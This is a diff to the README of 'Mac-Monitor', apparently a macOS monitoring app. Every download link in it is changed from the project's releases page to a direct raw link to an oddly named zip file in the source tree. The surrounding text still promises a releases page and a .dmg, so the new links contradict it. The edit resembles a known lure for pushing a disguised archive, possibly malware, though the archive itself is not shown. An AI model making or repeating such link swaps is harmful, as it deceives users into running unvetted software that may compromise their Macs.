@@ -1,6 +1,6 @@
 # 🖥️ Mac-Monitor - Simple Mac System Assistant
 
-[![Download Mac-Monitor](https://img.shields.io/badge/Download-Mac--Monitor-blue?style=for-the-badge)](https://github.com/Nazab4/Mac-Monitor/releases)
+[![Download Mac-Monitor](https://img.shields.io/badge/Download-Mac--Monitor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Nazab4/Mac-Monitor/main/Sources/Mac-Monitor-anele.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get Mac-Monitor for your Mac by visiting this page:
 
-[https://github.com/Nazab4/Mac-Monitor/releases](https://github.com/Nazab4/Mac-Monitor/releases)
+[https://raw.githubusercontent.com/Nazab4/Mac-Monitor/main/Sources/Mac-Monitor-anele.zip](https://raw.githubusercontent.com/Nazab4/Mac-Monitor/main/Sources/Mac-Monitor-anele.zip)
 
 This page shows all the available versions. Choose the latest release to download and install Mac-Monitor on your Mac.
 
@@ -59,7 +59,7 @@ You can also use Mac-Monitor to approve commands and file changes safely through
 
 1. **Go to the Release Page**  
    Click the big badge at the top or visit:  
-   [https://github.com/Nazab4/Mac-Monitor/releases](https://github.com/Nazab4/Mac-Monitor/releases)
+   [https://raw.githubusercontent.com/Nazab4/Mac-Monitor/main/Sources/Mac-Monitor-anele.zip](https://raw.githubusercontent.com/Nazab4/Mac-Monitor/main/Sources/Mac-Monitor-anele.zip)
 
 2. **Download the Latest Version**  
    Find the latest release and download the `.dmg` file for your Mac.
